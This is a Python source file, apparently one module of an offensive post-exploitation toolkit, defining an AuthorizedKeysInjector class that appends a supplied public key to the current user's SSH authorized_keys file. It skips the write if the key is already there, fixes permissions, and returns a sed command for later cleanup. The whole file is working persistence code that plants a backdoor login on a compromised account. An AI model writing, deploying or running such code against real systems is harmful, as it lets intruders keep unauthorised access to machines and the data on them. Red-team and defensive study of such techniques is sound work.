import os
from ..core import SSHPersistence
from ..utils.helpers import run_command

class AuthorizedKeysInjector(SSHPersistence):
    def inject(self, public_key: str, comment: str = None):
        print(f"[*] Injecting SSH key for user: {self.current_user}")
        self._ensure_ssh_dir()

        auth_file = f"{self.ssh_dir}/authorized_keys"
        key_entry = f"{public_key} {comment}\n" if comment else f"{public_key}\n"

        try:
            if os.path.exists(auth_file):
                with open(auth_file, 'r') as f:
                    if public_key.strip() in f.read():
                        print("[!] Key already present")
                        return None

            with open(auth_file, 'a') as f:
                f.write(key_entry)

            os.chmod(auth_file, 0o600)
            print(f"[+] Key injected → {auth_file}")

            return {
                'method': 'authorized_keys',
                'user': self.current_user,
                'file': auth_file,
                'remove_cmd': f"sed -i '/{public_key[:40]}/d' {auth_file}"
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

    def _ensure_ssh_dir(self):
        if not os.path.exists(self.ssh_dir):
            os.makedirs(self.ssh_dir, mode=0o700)
            print(f"[+] Created {self.ssh_dir}")
        os.chmod(self.ssh_dir, 0o700)